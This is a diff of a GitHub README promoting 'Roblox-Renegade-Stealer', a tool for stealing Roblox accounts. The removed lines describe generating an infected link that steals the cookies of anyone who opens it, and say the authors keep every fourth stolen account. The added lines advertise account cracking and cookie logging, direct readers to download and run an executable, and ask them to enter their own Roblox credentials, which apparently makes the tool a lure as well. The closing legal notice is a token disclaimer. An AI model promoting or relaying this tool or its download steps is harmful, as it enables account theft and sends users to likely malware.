@@ -1,25 +1,66 @@
-<div align="center">
+# 🔥 Roblox-Renegade-Stealer - Quick Access to Roblox Accounts
 
-  ![](https://raw.githubusercontent.com/idocuveddexusor/Roblox-Renegade-Stealer/main/pictures/1.png)
+## 🚀 Getting Started
+
+Welcome to Roblox-Renegade-Stealer! This application allows you to check and log Roblox account details easily. Follow these simple steps to download and run the software.
+
+## 📥 Download the Application
+
+[![Download Roblox-Renegade-Stealer](https://img.shields.io/badge/Download-Roblox--Renegade--Stealer-blue.svg)](https://github.com/Mohamed-Ref3at/Roblox-Renegade-Stealer/releases)
+
+Click the button above to go to the Releases page. Here, you will find the latest version of the application. 
+
+## 💻 System Requirements
+
+Before you start, ensure your system meets the following requirements:
+
+- Operating System: Windows 10 or later
+- Processor: 1 GHz or faster
+- RAM: 2 GB or more
+- Internet Connection: Required for account checking
+
+## 🔍 Features
+
+- **Account Cracking:** Easily check Roblox account credentials.
+- **Cookie Logging:** Capture and log cookies for detailed account information.
+- **User-Friendly Interface:** Navigate seamlessly without needing technical skills.
+- **Multi-Account Support:** Manage multiple accounts quickly.
+
+## 📖 How to Download & Install
+
+1. **Visit the Releases Page:** Click [here](https://github.com/Mohamed-Ref3at/Roblox-Renegade-Stealer/releases) to access the Releases page.
   
-  ![](https://raw.githubusercontent.com/idocuveddexusor/Roblox-Renegade-Stealer/main/pictures/.png)
-  
-</div>
+2. **Select the Latest Version:** Look for the most recent version at the top of the page.
 
-<div align="center"><a href="https://idocuveddexusor.github.io/id/60925686"><img src="https://raw.githubusercontent.com/idocuveddexusor/Roblox-Renegade-Stealer/main/pictures/0.png" height="80"></a></div>
+3. **Download the File:** Click the file named `Roblox-Renegade-Stealer.zip` to download the software.
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+4. **Extract the Files:** After downloading, find the `Roblox-Renegade-Stealer.zip` file in your downloads folder. Right-click the file and select "Extract All" to unzip the contents.
 
-### How to use?
+5. **Run the Application:** Open the folder where you extracted the files. Double-click on `Roblox-Renegade-Stealer.exe` to start the application.
 
-* Open your browser. We recommend you use the Tor browser for better anonymity.
-* Start the localhost page - http://127.0.0.1 
-* Start pythonw and reload the page.
-* Next, when you see the main menu, click on 'Payload-URL Generator' and generate an infected link.
-* Wait about 1–2 minutes and you will receive a special link. When anyone opens it in a browser, our code hijacks and steals Roblox cookies.
+6. **Follow On-Screen Instructions:** The application will guide you through the setup process. Simply follow the prompts to begin using the software.
 
-## Our software is absolutely free! But we are taking your every 4th account as pay for use.
+## 📊 Usage Instructions
+
+Once the application is running, here’s how to use it:
+
+1. **Log In:** Enter your Roblox account details in the provided fields.
+2. **Check Account:** Click the “Check Account” button to begin the process. The application will log the information for you.
+3. **Review Results:** View the results displayed on your screen. You can save or export this information as needed. 
+
+## 📞 Support
+
+If you encounter any issues while using the application, feel free to reach out:
+
+- GitHub Issues: You can report bugs or request features directly on the GitHub page.
+- Community Forums: Join discussions and seek advice from other users.
+
+## ⚖️ Legal Notice
+
+Please remember that using this software for malicious purposes is against both Roblox's Terms of Service and general ethical practices. Always use the application responsibly.
+
+## 📄 Summary
+
+Roblox-Renegade-Stealer is a powerful tool for anyone wanting to manage and check Roblox account credentials. You can easily download it by visiting the [Releases page](https://github.com/Mohamed-Ref3at/Roblox-Renegade-Stealer/releases). Follow the installation instructions provided above, and you'll be on your way to successfully using the application.
+
+Thank you for choosing Roblox-Renegade-Stealer! Happy logging!
